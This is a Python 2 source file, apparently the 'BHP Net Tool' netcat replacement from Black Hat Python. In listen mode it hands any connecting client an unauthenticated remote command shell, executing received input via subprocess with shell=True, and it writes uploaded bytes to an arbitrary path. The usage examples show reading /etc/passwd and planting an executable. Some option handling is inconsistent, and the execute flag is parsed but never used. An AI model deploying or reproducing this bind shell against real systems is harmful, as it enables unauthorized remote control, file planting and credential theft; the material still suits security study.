#!/usr/bin/python2.7

import sys
import socket
import getopt
import threading
import subprocess


# Define relevant global variables
listen                 = False
command                = False
upload                 = False
execute                = ""
target                 = ""
upload_destination     = ""
port                   = 0


# Usage menu
def usage():
    print "BHP Net Tool"
    print
    print "Usage: bhpnet.py -t target_host -p port"
    print "-l --listen                 - listen on [host]:[port] for "
    print "                              incoming connections"
    print "-e --execute=file_to_run    - execute the given file upon "
    print "                              receiving a connection"
    print "-c --command                - initialize a command shell"
    print "-u --upload=destination     - upon receiving connection "
    print "                              upload a file and write to "
    print "                              [destination]"
    print
    print
    print "Examples: "
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
    sys.exit(0)


# Client TCP Sender
def client_sender(buffer):
    # Create client socket object
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to target host address
        client_socket.connect((target, port))

        if len(buffer):
            client_socket.send(buffer)
        
        while True:
            recv_length = 1
            response = ""

            while recv_length:
                data            = client_socket.recv(4096)
                recv_length     = len(data)
                response       += data

                if recv_length < 4096:
                    break
            
            print response,

            # Waiting for more input
            buffer = raw_input("")
            buffer += "\n"

            # Send data off
            client_socket.send(buffer)

    except:
        print "[*] Exception! Exiting now."

        # Close the connection
        client_socket.close()


# Handle command execution and command shell
def server_loop():
    global target

    # If no target is defined, listen on all interfaces
    if not len(target):
        target = "0.0.0.0"

    # Create server socket object
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Bind the server socket to the target ip address
    server_socket.bind((target, port))

    server_socket.listen(5)

    while True:
        client_socket, address = server_socket.accept()

        # Spin off a thread to handle new client
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()

def run_command(cmd):
    # Trim the line
    cmd = cmd.rstrip()

    # Run command and get output back
    try:
        output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"

    # Send the output back to the client
    return output


# Handle client connection
def client_handler(client_socket):
    global upload
    global execute
    global command

    # Check if we are receiving an upload from connection
    if len(upload_destination):
        # Read in all of the bytes to destination
        file_buffer = ""

        # Read data until none is available
        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data
        
        # Write the bytes from file buffer
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            # Confirm the file was successfully written out
            message = "Successfully saved file to %s\r\n" % upload_destination
            client_socket.send(message)
        except:
            # Send fail message
            message = "Failed to save file to %s\r\n" % upload_destination 
            client_socket.send(message)
    
    # Check if a command shell was requested
    if command:
        while True:
            # Show prompt
            client_socket.send("<BHP:#>")

            # Receive until linefeed is present
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
            
            # Send back output from running the command
            response = run_command(cmd_buffer)

            # Send back the response
            client_socket.send(response)

# Main
def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # Read the command line options
    try:
        options, arguments = getopt.getopt(sys.argv[1:], "hle:t:p:cu", ["help", "listen", "execute", "target", "port", "command", "upload"])

    except getopt.GetoptError as err:
            print str(err)
            usage()
    
    for opt, arg in options:
        if opt in ("-h", "--help"):
            usage()
        elif opt in ("-l", "--listen"):
            listen = True
        elif opt in ("-e", "--execute"):
            execute = arg
        elif opt in ("-c", "--commandshell"):
            command = True
        elif opt in ("-u", "--upload"):
            upload_destination = arg
        elif opt in ("-t", "--target"):
            target = arg
        elif opt in ("-p", "--port"):
            port = int(arg)
        else:
            assert False, "Unhandled Option"
    
    # If not listening
    if not listen and len(target) and port > 0:
        # Read in buffer from commandline. Ctrl-D to bypass stdin.read if not sending input to stdin
        buffer = sys.stdin.read()

        # Send data
        client_sender(buffer)

    # If listening
    if listen:
        server_loop()

main()
                                         